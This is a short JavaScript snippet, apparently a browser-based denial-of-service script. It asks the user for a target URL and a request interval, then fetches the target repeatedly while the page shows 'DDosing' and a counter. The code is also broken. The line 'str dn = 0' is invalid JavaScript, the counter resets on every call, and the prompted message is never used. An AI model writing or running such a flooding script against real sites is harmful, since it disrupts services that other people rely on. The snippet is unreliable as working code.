var target = prompt("Enter target url.");
var speed = prompt("Make request ever miliseconds");
var msg = prompt("Message to HTTP server");

function attack() {  

    str dn = 0
	
	
	
   dn = dn + 1
   fetch(target)
   document.body.innerHTML= `DDosing ${dn}`;
   

                    
}
setInterval(attack, speed);  
